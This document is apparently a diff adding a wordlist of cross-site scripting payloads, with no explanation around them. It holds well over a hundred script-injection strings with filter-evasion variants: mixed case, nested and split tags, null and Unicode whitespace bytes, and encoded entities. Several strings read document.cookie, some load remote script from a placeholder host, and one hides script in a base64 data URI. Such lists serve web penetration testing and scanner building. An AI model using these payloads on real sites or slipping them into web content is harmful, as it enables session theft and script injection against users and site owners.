+';prompt("teste")//
+'); prompt('XSS
+\";;prompt(';XSS';);//
+\";prompt('XSS');//
+\\";prompt('XSS');//
+'); prompt('xss'); var x='
+\\'); prompt(\'xss\');var x=\'
+"'`><p><svg><script>a='hello\x27;javascript:prompt(1)//';</script></p>
+\&quot;;prompt(&apos;XSS&apos;);//
+"><s"%2b"cript>prompt(document.cookie)</script>
+</scrip</script>t><img src =q onerror=prompt(8)>
+>"><ScRiPt%20%0a%0d>prompt(561177485777)%3B</ScRiPt>
+</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+"`'><script>-javascript:prompt(1)</script>
+'""><script language="JavaScript"> prompt('X \nS \nS');</script>
+"><script>prompt(0)</script>
+"><script>prompt(1337)</script>"><script>prompt("XSS by \nxss</h1></marquee>
+"/><script>prompt(1)</script>
+<ScRiPt>prompt(1)</sCriPt>
+"><<script>prompt(document.cookie);//<</script>
+'"><script>prompt(document.cookie)</script>
+"><ScRiPt>prompt(document.cookie)</script>
+<script>prompt()</script>
+"><script>prompt(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+"><script prompt(String.fromCharCode(88,83,83))</script>
+">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
+"><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
+'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
+\'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
+"><script>prompt("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+!--" /><script>prompt('xss');</script>
+='><script>prompt("xss")</script>
+"><script>prompt('XSS')</script>
+'">><script>prompt('XSS')</script>
+>"><script>prompt("XSS")</script>&
+<<SCRIPT>prompt("XSS");//<</SCRIPT>
+<?='<SCRIPT>prompt("XSS")</SCRIPT>'?>
+</script><script>prompt(1)</script>
+<;/script>;<;script>;prompt(1)<;/script>;
+</script><script >prompt(document.cookie)</script>
+//--></SCRIPT><SCRIPT>prompt(String.fromCharCode(88,83,83));
+></SCRIPT>">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
+'>"><script src = 'http://www.site.com/XSS.js'></script>
+<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+"`'><script>\x00javascript:prompt(1)</script>
+"`'><script>\x09javascript:prompt(1)</script>
+"`'><script>\x0Ajavascript:prompt(1)</script>
+"`'><script>\x0Bjavascript:prompt(1)</script>
+"`'><script>\x0Cjavascript:prompt(1)</script>
+"`'><script>\x0Djavascript:prompt(1)</script>
+"`'><script>\x20javascript:prompt(1)</script>
+"`'><script>\x21javascript:prompt(1)</script>
+"`'><script>\x2Bjavascript:prompt(1)</script>
+'"`><script>/* *\x2Fjavascript:prompt(1)// */</script>
+"`'><script>\x3Bjavascript:prompt(1)</script>
+"`'><script>\x7Ejavascript:prompt(1)</script>
+"`'><script>\xC2\x85javascript:prompt(1)</script>
+"`'><script>\xC2\xA0javascript:prompt(1)</script>
+"`'><script>\xE1\x9A\x80javascript:prompt(1)</script>
+"`'><script>\xE1\xA0\x8Ejavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x80javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x81javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x82javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x83javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x84javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x85javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x86javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x87javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x88javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x89javascript:prompt(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:prompt(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:prompt(1)</script>
+"`'><script>\xE2\x80\xA8javascript:prompt(1)</script>
+"`'><script>\xE2\x80\xA9javascript:prompt(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:prompt(1)</script>
+"`'><script>\xE2\x81\x9Fjavascript:prompt(1)</script>
+"`'><script>\xE3\x80\x80javascript:prompt(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:prompt(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:prompt(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:prompt(1)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:prompt(1)</script>
+<;scrscriptipt>;prompt(1)<;/scrscriptipt>;
+<scr<script>ipt>prompt(1)</scr</script>ipt>
+<scrscriptipt>prompt(1)</scrscriptipt>
+<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>
+'></select><script>prompt(123)</script>
+'</select><script>prompt()</script>
+src="http://www.site.com/XSS.js"></script>
+"><STYLE>@import"javascript:prompt('XSS')";</STYLE>
+}</style><script>a=eval;b=prompt;a(b(/XSS/.source));</script>
+'"></title><script>prompt(1111)</script>
+'"></title><script>prompt(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>prompt("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
+'%uff1cscript%uff1eprompt('XSS')%uff1c/script%uff1e'
+veris-->group<svg/onload=prompt(/XSS/)//
+"'`><\x00img src=xxx:x onerror=javascript:prompt(1)>
+--><!-- --\x00> <img src=xxx:x onerror=javascript:prompt(1)> -->
+'`"><\x00script>javascript:prompt(1)</script>
+--><!-- --\x21> <img src=xxx:x onerror=javascript:prompt(1)> -->
+"'`><\x3Cimg src=xxx:x onerror=javascript:prompt(1)>
+'`"><\x3Cscript>javascript:prompt(1)</script>
+'`"><\x3Cscript>javascript:prompt(1)</script>        
+\x3Cscript>javascript:prompt(1)</script>
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:prompt(1)> -->
+<!--\x3E<img src=xxx:x onerror=javascript:prompt(1)> -->
+">/XaDoS/><script>prompt(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
+'';!--"<XSS>=&{()}
+xss&#58;ex&#x2F;*XSS*//*/*/pression(prompt(\"XSS\"))'&gt;
+žscriptuprompt(EXSSE)ž/scriptu
+"-prompt(1)-"
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
